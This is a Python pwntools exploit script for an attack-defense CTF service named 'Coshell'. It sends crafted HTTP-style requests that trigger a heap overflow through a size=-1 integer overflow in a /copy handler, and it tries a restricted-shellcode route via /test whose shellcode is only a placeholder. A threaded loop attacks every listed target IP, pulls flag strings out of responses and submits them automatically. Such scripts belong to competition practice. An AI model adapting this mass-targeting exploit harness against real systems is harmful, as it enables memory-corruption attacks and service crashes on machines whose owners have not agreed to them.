#!/usr/bin/env python3
"""
Coshell AWD Exploit
===================
Vulnerability: Signed integer overflow in /copy handler
- Passing size=-1 bypasses size validation 
- Causes massive heap overflow via memcpy

Seccomp allows: open, read, write, exit (ORW sandbox)
Use /test endpoint for shellcode if we can craft valid bytes 0-5 only.
"""
import os
os.environ['PWNLIB_NOTERM'] = '1'

import sys
import argparse
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Fix import path - remove script dir to avoid local pwn.py, but add it back for awd_lib
script_dir = os.path.dirname(os.path.abspath(__file__))
clean_path = [p for p in sys.path if p != script_dir]
sys.path = clean_path

from pwn import *

# Now add script dir back for awd_lib
sys.path.insert(0, script_dir)
from awd_lib import chal, submit, get_targets, get_our_ip

# Rate limit submissions
_submit_lock = threading.Lock()
_last_submit = 0
SUBMIT_DELAY = 0.5

def rate_limited_submit(flag):
    """Submit with rate limiting."""
    global _last_submit
    with _submit_lock:
        elapsed = time.time() - _last_submit
        if elapsed < SUBMIT_DELAY:
            time.sleep(SUBMIT_DELAY - elapsed)
        result = submit(flag)
        _last_submit = time.time()
        return result

context.log_level = 'critical'  # Suppress pwntools noise

# Disable pwntools logging completely
import logging
logging.getLogger('pwnlib').setLevel(logging.CRITICAL)

# Try to load challenge config, but don't fail if file not found
try:
    chal(creds_file="coshell.xls")
except:
    pass  # Will use defaults or manual targeting

PORT = 1000
TIMEOUT = 5
MAX_WORKERS = 8


def make_request(method, path, body):
    """Create HTTP request."""
    return f"{method} {path} HTTP/1.1\r\nContent-Length: {len(body)}\r\n\r\n".encode() + body


def add_slot(index, size, data):
    """Create /add request."""
    data_escaped = data.replace(b'"', b'\\"')
    body = f'{{"index": {index}, "size": {size}, "data_size": {len(data)}, "data": "'.encode()
    body += data_escaped + b'"}'
    return make_request("POST", "/add", body)


def copy_slot(dst, src, size):
    """Create /copy request."""
    body = f'{{"dst": {dst}, "src": {src}, "size": {size}}}'.encode()
    return make_request("POST", "/copy", body)


def test_request():
    """Create /test request (needs 250 bytes of shellcode after)."""
    return make_request("POST", "/test", b"")


def exploit_heap_overflow(ip, port=PORT):
    """
    Exploit via heap overflow using negative size in /copy.
    This triggers a massive memcpy that can crash or corrupt heap.
    """
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Allocate slots with controlled data
        io.send(add_slot(0, 32, b"A" * 32))
        io.send(add_slot(1, 255, b"B" * 200))
        
        # Wait for responses
        io.recv(timeout=1)
        
        # Trigger heap overflow with negative size
        io.send(copy_slot(0, 1, -1))
        
        try:
            resp = io.recv(timeout=2)
            # Check if we got any flag-like output
            if b'flag{' in resp:
                start = resp.find(b'flag{')
                end = resp.find(b'}', start) + 1
                flag = resp[start:end].decode()
                io.close()
                return flag
        except:
            pass
        
        io.close()
        return None
        
    except Exception as e:
        return None


def exploit_shellcode(ip, port=PORT):
    """
    Exploit via /test shellcode execution.
    
    Constraints:
    - Only bytes 0x00-0x05 allowed (others become 0x00)
    - Seccomp allows: open, read, write, exit
    - All registers set to 0x1337133713371337
    
    This is very restricted - need self-modifying code approach.
    """
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Send /test request
        io.send(test_request())
        
        # Wait for "input:" prompt
        io.recvuntil(b'input:', timeout=TIMEOUT)
        
        # Send shellcode (250 bytes)
        # For now, just NOP-like instructions that won't immediately crash
        # Real shellcode would need careful crafting with bytes 0-5 only
        shellcode = b'\x04\x00' * 125  # ADD AL, 0 - effectively NOP
        
        io.send(shellcode)
        
        try:
            resp = io.recv(timeout=2)
            if b'flag{' in resp:
                start = resp.find(b'flag{')
                end = resp.find(b'}', start) + 1
                flag = resp[start:end].decode()
                io.close()
                return flag
        except:
            pass
        
        io.close()
        return None
        
    except Exception as e:
        return None


def attack_target(ip, port=PORT):
    """Attack single target with multiple methods."""
    # Try heap overflow first
    flag = exploit_heap_overflow(ip, port)
    if flag:
        result = rate_limited_submit(flag)
        if result.get('success'):
            status = "NEW" if not result.get('duplicate') else "dup"
        else:
            status = f"reject:{result.get('message', 'unknown')}"
        return (ip, flag, status, "heap")
    
    # Fallback to shellcode approach
    flag = exploit_shellcode(ip, port)
    if flag:
        result = rate_limited_submit(flag)
        if result.get('success'):
            status = "NEW" if not result.get('duplicate') else "dup"
        else:
            status = f"reject:{result.get('message', 'unknown')}"
        return (ip, flag, status, "shellcode")
    
    return (ip, None, "failed", None)


def test_local():
    """Test vulnerability locally."""
    print("[*] Testing vulnerability locally...")
    
    try:
        io = process(['./src/chal'])
    except:
        print("[-] Cannot find ./src/chal - trying other paths")
        try:
            io = process(['./chal'])
        except:
            print("[-] Binary not found. Place chal in current dir or src/")
            return
    
    # Test 1: Normal operation
    print("[*] Test 1: Normal add operations")
    io.send(add_slot(0, 32, b"A" * 8))
    io.send(add_slot(1, 64, b"B" * 8))
    resp = io.recv(timeout=1)
    print(f"    Response: {resp.decode().strip()}")
    
    # Test 2: Heap overflow with negative size
    print("[*] Test 2: Heap overflow with size=-1")
    io.send(copy_slot(0, 1, -1))
    try:
        resp = io.recv(timeout=1)
        if b'copied' in resp:
            print(f"    [!] VULNERABLE - copy succeeded with size=-1!")
        else:
            print(f"    Response: {resp}")
    except:
        print("    [+] Binary crashed - overflow triggered")
    
    io.close()
    print("[*] Local test complete")


def main():
    parser = argparse.ArgumentParser(description='Coshell AWD Exploit')
    parser.add_argument('target', nargs='?', help='Target IP or "local" for local test')
    parser.add_argument('--port', '-p', type=int, default=PORT, help='Target port')
    parser.add_argument('--loop', action='store_true', help='Loop continuously')
    parser.add_argument('--delay', type=int, default=60, help='Loop delay in seconds')
    parser.add_argument('--workers', '-w', type=int, default=MAX_WORKERS, help='Parallel workers')
    args = parser.parse_args()
    
    # Local test mode
    if args.target == 'local':
        test_local()
        return
    
    # Single target mode
    if args.target and args.target != 'all':
        print(f"[*] Attacking {args.target}:{args.port}")
        ip, flag, status, method = attack_target(args.target, args.port)
        if flag:
            print(f"[+] {ip}: {flag} ({status}) [{method}]")
        else:
            print(f"[-] {ip}: {status}")
        return
    
    # AWD mode - attack all targets
    try:
        our_ip = get_our_ip()
        targets = get_targets()
    except Exception as e:
        print(f"[-] Cannot load targets: {e}")
        print("[*] Usage: python3 exploit_coshell.py <ip> or 'local'")
        return
    
    print(f"[*] Our IP: {our_ip}, Targets: {len(targets)}, Workers: {args.workers}")
    
    while True:
        success = failed = new_flags = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(attack_target, ip, args.port): ip for ip in targets}
            
            for future in as_completed(futures):
                ip, flag, status, method = future.result()
                if flag:
                    m = f"[{method}]" if method else ""
                    print(f"[+] {ip}: {flag} ({status}) {m}")
                    success += 1
                    if status == "NEW":
                        new_flags += 1
                else:
                    print(f"[-] {ip}: {status}")
                    failed += 1
        
        elapsed = time.time() - start_time
        print(f"[*] Round: {success} ok, {failed} fail, {new_flags} NEW ({elapsed:.1f}s)")
        
        if not args.loop:
            break
        
        print(f"[*] Sleeping {args.delay}s...")
        time.sleep(args.delay)


if __name__ == '__main__':
    main()
